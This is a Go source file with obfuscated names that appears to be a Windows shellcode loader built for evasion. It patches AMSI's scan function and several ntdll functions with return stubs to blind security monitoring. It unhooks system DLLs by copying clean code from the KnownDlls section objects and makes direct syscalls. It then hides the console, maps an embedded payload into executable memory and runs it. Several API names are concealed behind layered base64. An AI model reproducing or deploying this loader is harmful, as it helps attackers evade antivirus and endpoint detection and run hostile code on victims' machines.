
	
	package main

	
	

	import (
		filepe "debug/pe"
		"encoding/base64"
		"encoding/hex"
		
		"vOiooNQLPqfOB/vOiooNQLPqfOB"
		"strconv"
		"fmt"
		"syscall"
		"unsafe"
		"time"
		


		"golang.org/x/sys/windows"
		"golang.org/x/sys/windows/registry"
		"github.com/Binject/debug/pe"
		"github.com/awgh/rawreader"
	)
	


	const (
		hIsHLwbK= 0x1F0FFF
	)
	var _ unsafe.Pointer
	var (
		pZxGKjc uint16
		skUFqDs uint16
		ErIqM int = 4
	)

	
	
	
	
	func nafhkPG() string {
		eOtYTu, _ := registry.OpenKey(registry.LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", registry.QUERY_VALUE)
		MntMV, _, _ :=  eOtYTu.GetStringValue("CurrentVersion")
		IvVdVbGG, _, err := eOtYTu.GetIntegerValue("CurrentMajorVersionNumber")
		if err == nil{
			//YiGWTB, _, _ := eOtYTu.GetIntegerValue("CurrentMinorVersionNumber")
			MntMV = strconv.FormatUint(IvVdVbGG, 10)
		}
		defer eOtYTu.Close()
		if MntMV == "10" {
			pZxGKjc = 0x18
			skUFqDs = 0x50
		} else if MntMV == "6.3" {
			pZxGKjc = 0x17
			skUFqDs = 0x4f
		} else if MntMV == "6.2" {
			pZxGKjc = 0x16
			skUFqDs = 0x4e
		} else if MntMV == "6.1" {
			pZxGKjc = 0x15
			skUFqDs= 0x4d
		}
		return MntMV 

	}

	func GfcQy(EvctN string,) string {
		var jjBeEcIg []byte
			jjBeEcIg, _ = base64.StdEncoding.DecodeString(EvctN)
		kIaYp := 1
		for i := 1; i < ErIqM; i++ {
			jjBeEcIg, _ = base64.StdEncoding.DecodeString(string(jjBeEcIg))
			kIaYp += i
		}
		return string(jjBeEcIg)
	
	}

	

	func hxWUbMmmhMeffEJaw(show bool) {
		APnUkLjqjx := syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(GfcQy("VldwS1YwMUdSWGxQV0ZacVRXcHNlbGRzV210alIwcDBWVzVhYTJSNk1Eaz0="))
		XVozxsFzEShI := syscall.NewLazyDLL(string([]byte{'u', 's', 'e', 'r', '3', '2',})).NewProc(GfcQy("VmxSS2IyUnRVWGhhU0VKcFlsWktNbHBJWXpsUVVUMDk="))
		buKjGRRmmJlxWeA, _, _ := APnUkLjqjx.Call()
		if buKjGRRmmJlxWeA == 0 {
			return
		}
		if show {
		var wOKGnAmeQJgvUZ uintptr = 9
		XVozxsFzEShI.Call(buKjGRRmmJlxWeA, wOKGnAmeQJgvUZ)
		} else {
		var tyPPFeJClDnDLTBq uintptr = 0
		XVozxsFzEShI.Call(buKjGRRmmJlxWeA, tyPPFeJClDnDLTBq)
		}
	}



	
	const (
		NLYB= 997
	)
	var dNNXGmkv error = syscall.Errno(NLYB)
	var zlOyZ = syscall.NewLazyDLL(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2',})).NewProc(GfcQy("Vm1wT1MyTkhVa2hXYkVacVlsUnNjVmRzYUU5bGJGSllWbTVTYVUwd2J6RT0="))


	func qABAbljQ(LGCGTan uintptr, DJyszdY uintptr, Domd *byte, gGrGf uintptr, JNjqZnFG *uintptr) (err error) {
		r1, _, e1 := syscall.Syscall6(zlOyZ.Addr(), 5, uintptr(LGCGTan), uintptr(DJyszdY), uintptr(unsafe.Pointer(Domd)), uintptr(gGrGf), uintptr(unsafe.Pointer(JNjqZnFG)), 0)
		if r1 == 0 {
			if e1 != 0 {
				err = NcHuR(e1)
			} else {
				err = syscall.EINVAL
			}
		}
		return
	}

	func NcHuR(e syscall.Errno) error {
		switch e {
		case 0:
			return nil
		case NLYB:
			return dNNXGmkv
		}
	
		return e
	}
	

	
	var ZprOzLvu = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(GfcQy("Vld4b1UwMHhVblJQVkVKb1ZqRndkMWRVU2tkTlIwWllUMWhXVm1KV1duVlpWbWhQVFVad1dWTlVNRDA9"))
	var bmzwpnW = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(GfcQy("Vld4b1UwMHhTbGxYYlhocFlteEtWRmRzWkd0alIwMTZWVzE0YWxwNk1Eaz0="))
	var OBGG = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(GfcQy("Vld4b1UwMHhTbGxYYlhocFlteEtXVmt5TVhOTlJuQldWMnBHYVZJell6az0="))
	var wFWsA = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l',})).NewProc(GfcQy("Vld4b1UwMHhTbGxYYlhocFlteEtXVmt5TVhOTlJuQlNVRlF3UFE9PQ=="))

	func lNnYP() {
		HVFnf := uintptr(0xffffffffffffffff)
		yuEF := []uintptr{ ZprOzLvu.Addr(), bmzwpnW.Addr(), OBGG.Addr(), wFWsA.Addr()}
		for i, _ := range yuEF {
			GZlyq, _ := hex.DecodeString("4833C0C3")
			var AJZCLyKi uintptr
			BSGOlS := len(GZlyq)
			qABAbljQ(HVFnf, yuEF[i], &GZlyq[0], uintptr(uint32(BSGOlS)), &AJZCLyKi)
		}
	}

	func qLtMYm(HVFnf windows.Handle) {
		yuEF := []uintptr{ ZprOzLvu.Addr(), bmzwpnW.Addr(), OBGG.Addr(), wFWsA.Addr()}
		for i, _ := range yuEF {
			GZlyq, _ := hex.DecodeString("4833C0C3")
			var AJZCLyKi uintptr
			BSGOlS := len(GZlyq)
			qABAbljQ(uintptr(HVFnf), yuEF[i], &GZlyq[0], uintptr(uint32(BSGOlS)), &AJZCLyKi)
		}
	}



	
	func MygCfA() {
		var lZSXufm uint64
		lZSXufm = 0xffffffffffffffff
		hEQweF, _ := windows.LoadLibrary(string([]byte{'a','m','s','i','.','d','l','l'}))
		XpdcyXjW, _ := windows.GetProcAddress(hEQweF, string([]byte{'a','m','s','i','S','c','a','n','B','u','f','f','e','r'}))
		vTLOKaf, _ :=  hex.DecodeString("B857000780C3")
		var lNsa uintptr
		PylZYSD := len(vTLOKaf)
		qABAbljQ(uintptr(lZSXufm), uintptr(uint(XpdcyXjW)), &vTLOKaf[0], uintptr(uint32(PylZYSD)), &lNsa)
	}
	

	var procReadProcessMemory = syscall.NewLazyDLL("kernel32.dll").NewProc("ReadProcessMemory")

	func XeyRl() uintptr {
		var funcNtAllocateVirtualMemory = syscall.NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc("NtAllocateVirtualMemory")
		handle := uintptr(0xffffffffffffffff)
		num := 2
		var add uintptr
		AllAddr := funcNtAllocateVirtualMemory.Addr()
		for i := 0; i < 20; i++ {
			rawr, _, _ := ReadProcessMemory(handle, AllAddr+uintptr(i), uintptr(num))
			f := fmt.Sprintf("%0x", rawr)
			if f == "0f05" {
				add = AllAddr + uintptr(i)
				return add
			}
		}
		return add
	}

	func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, nSize uintptr) (lpBuffer []uint8, lpNumberOfBytesRead int, ok bool) {
		var nBytesRead int
		buf := make([]uint8, nSize)
		ret, _, _ := procReadProcessMemory.Call(
			uintptr(hProcess),
			lpBaseAddress,
			uintptr(unsafe.Pointer(&buf[0])),
			nSize,
			uintptr(unsafe.Pointer(&nBytesRead)),
		)
	
		return buf, nBytesRead, ret != 0
	}
	
		

	func main() {
		
		lNnYP()
		MygCfA()
		time.Sleep(2692 * time.Millisecond)
		MntMV := nafhkPG()
		
		if MntMV == "10" {
			VutSdouDLDHinZt()
		}
		lNnYP()
		hxWUbMmmhMeffEJaw(false)
		lRHiRiPLgS := vOiooNQLPqfOB.CNOXjQMbaaKqzEB()
		YXOsXYufJjWhyCAU(lRHiRiPLgS)
	}

	
	func YXOsXYufJjWhyCAU(lRHiRiPLgS []byte){
		XOAGxwyAIEVHMAPN := windows.NewLazySystemDLL("ntdll.dll")
		MGwOSYvFBupgvPZ := windows.NewLazySystemDLL("kernel32")
		DCvkIlzACnpBiJERZw := XOAGxwyAIEVHMAPN.NewProc("RtlCopyMemory")
		HhbXblLnUFBgr := MGwOSYvFBupgvPZ.NewProc("VirtualAlloc")

		var xAqJRrBElTn, oeqXjnonEsP uintptr
		var bqlcxDtgdjkny uintptr
		dmpGSxpoCS := uintptr(0xffffffffffffffff)
		hXJwMnECIyLab := uintptr(len(lRHiRiPLgS))
		oeqXjnonEsP = 0x40
		xAqJRrBElTn = 0x3000
		elriWluaelNmA, _, _ := HhbXblLnUFBgr.Call(0, uintptr(len(lRHiRiPLgS)), xAqJRrBElTn, oeqXjnonEsP)

		
		DCvkIlzACnpBiJERZw.Call(elriWluaelNmA, (uintptr)(unsafe.Pointer(&lRHiRiPLgS[0])), uintptr(len(lRHiRiPLgS)))
		
		


		vOiooNQLPqfOB.QPKgZQaJhQErXcmbO(
			skUFqDs, 
			dmpGSxpoCS,
			(*uintptr)(unsafe.Pointer(&elriWluaelNmA)),
			&hXJwMnECIyLab,
			0x20,
			&bqlcxDtgdjkny,
			)
		
		syscall.Syscall(elriWluaelNmA, 0, 0, 0, 0)
	}


	
	
		var HjQbqhMDDSusnlzRBT      uint16
		var kzjNVudFHLaKi uint16
		var lPYsifsrNyNgtmL      uint16
		func VutSdouDLDHinZt()  {
			QvyDsPUmNqVQnzIsef := []string{string([]byte{'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}),
			string([]byte{'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}),
			string([]byte{'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'})}
		
	 	for i, _ := range QvyDsPUmNqVQnzIsef {
			KnownDLL(QvyDsPUmNqVQnzIsef[i])
			}
		}

		var procNtOpenSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtOpenSection")
		var procNtMapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtMapViewOfSection")
		var procNtUnmapViewOfSection = syscall.NewLazyDLL("ntdll.dll").NewProc("NtUnmapViewOfSection")

		type sstring struct {
			PWstr *uint16
		}
	
		func (s sstring) String() string {
			return windows.UTF16PtrToString(s.PWstr)
		}
	
		func KnownDLL(HdLFnXLckfRQGC  string) []byte {
			
			var OhjHrJnZAPmjjJTS , tQZnlDWsDtwQ , soNtNagdGMBITiUp  uintptr
			QtvuoTtEemJXjdr := uintptr(0xffffffffffffffff)
			TXCqNVclTuMsBqZ := "\\" + string([]byte{'K', 'n', 'o', 'w', 'n', 'D', 'l', 'l', 's'}) + "\\" + HdLFnXLckfRQGC 
			JRzNtBKYeqKulBW, _ := windows.NewNTUnicodeString(TXCqNVclTuMsBqZ)
			FGOUHjFeUkXbt := windows.OBJECT_ATTRIBUTES{}
			FGOUHjFeUkXbt.Attributes = 0x00000040
			FGOUHjFeUkXbt.ObjectName = JRzNtBKYeqKulBW
			FGOUHjFeUkXbt.Length = uint32(unsafe.Sizeof(windows.OBJECT_ATTRIBUTES{}))
			oKLVfklOEsbxzBX := XeyRl()
			HjQbqhMDDSusnlzRBT = 0x37
			iPopzPPjiTTbNa := 0x0004
			r, _ := vOiooNQLPqfOB.FzgKgVLiTTSY(
				HjQbqhMDDSusnlzRBT, 
				oKLVfklOEsbxzBX, 
				uintptr(unsafe.Pointer(&OhjHrJnZAPmjjJTS)), 
				uintptr(iPopzPPjiTTbNa), 
				uintptr(unsafe.Pointer(&FGOUHjFeUkXbt)),
			)
			if r != 0 {
			}
			kzjNVudFHLaKi = 0x28
			zero := 0
			one := 1
			vOiooNQLPqfOB.AlMFeMRUqpZ(
				kzjNVudFHLaKi, 
				oKLVfklOEsbxzBX, 
				OhjHrJnZAPmjjJTS, 
				QtvuoTtEemJXjdr, 
				uintptr(unsafe.Pointer(&soNtNagdGMBITiUp)), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(zero), 
				uintptr(unsafe.Pointer(&tQZnlDWsDtwQ)), 
				uintptr(one), 
				uintptr(zero), 
				uintptr(syscall.PAGE_READONLY),
			)
			RYzMWXuGjspUpFS := rawreader.New(soNtNagdGMBITiUp, int(tQZnlDWsDtwQ))
			bZkdSYBnVQrJzu, _ := pe.NewFileFromMemory(RYzMWXuGjspUpFS)
			huMXfGGnxZmQsuWyYg, err := bZkdSYBnVQrJzu.Bytes()
			if err != nil {
			}
			IApyUJqIuQs := bZkdSYBnVQrJzu.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
			KKClCkfozKdbgWUO := huMXfGGnxZmQsuWyYg[IApyUJqIuQs.Offset:IApyUJqIuQs.Size]
			KAXniRFMOZ, error := filepe.Open(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  HdLFnXLckfRQGC )
			if error != nil {
			}
			IWxcjjMTOs := KAXniRFMOZ.Section(".text")
			ztXxTabtgAqdn, error := windows.LoadDLL(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) +  HdLFnXLckfRQGC )
			if error != nil {
			}
			HUBxqdFIavanhiRcL := ztXxTabtgAqdn.Handle
			XwKITbdxtCD  := uintptr(HUBxqdFIavanhiRcL)
			CSYxgyLkIFf := uint(XwKITbdxtCD) + uint(IWxcjjMTOs.VirtualAddress)
			lPYsifsrNyNgtmL = 0x50
			KMssLwORCIMoZATgw := uintptr(len(KKClCkfozKdbgWUO))
			var glvZZeEmhCcyU uintptr

			kMhrEvmvky, _ := vOiooNQLPqfOB.ZBccPmfzZXNTkujLA(
				lPYsifsrNyNgtmL, 
				oKLVfklOEsbxzBX, 
				QtvuoTtEemJXjdr, 
				(*uintptr)(unsafe.Pointer(&CSYxgyLkIFf)), 
				&KMssLwORCIMoZATgw, 
				0x40, 
				&glvZZeEmhCcyU,
			)
			if kMhrEvmvky != 0 {
			}
			mdGwCoBiwSEeqqY(KKClCkfozKdbgWUO, uintptr(CSYxgyLkIFf))
			KAXniRFMOZ.Close()
			kMhrEvmvky, _ = vOiooNQLPqfOB.ZBccPmfzZXNTkujLA(
				lPYsifsrNyNgtmL, 
				oKLVfklOEsbxzBX, 
				QtvuoTtEemJXjdr, 
				(*uintptr)(unsafe.Pointer(&CSYxgyLkIFf)), 
				&KMssLwORCIMoZATgw, 
				0x20, 
				&glvZZeEmhCcyU,
			)
			if kMhrEvmvky != 0 {
			}
			syscall.Syscall(uintptr(procNtUnmapViewOfSection.Addr()), 2, uintptr(QtvuoTtEemJXjdr), soNtNagdGMBITiUp, 0)
			return KKClCkfozKdbgWUO
		}


		func mdGwCoBiwSEeqqY(HUqILbVlxNPaIba []byte, DRDqRsTYbPpp uintptr) {
			for jHOvEkkglLWGGi := uint32(0); jHOvEkkglLWGGi < uint32(len(HUqILbVlxNPaIba)); jHOvEkkglLWGGi++ {
				FCYxguYabgp := unsafe.Pointer(DRDqRsTYbPpp + uintptr(jHOvEkkglLWGGi))
				FqJhIntiVYtfKJL := (*byte)(FCYxguYabgp)
				*FqJhIntiVYtfKJL = HUqILbVlxNPaIba[jHOvEkkglLWGGi]
			}
		}

	
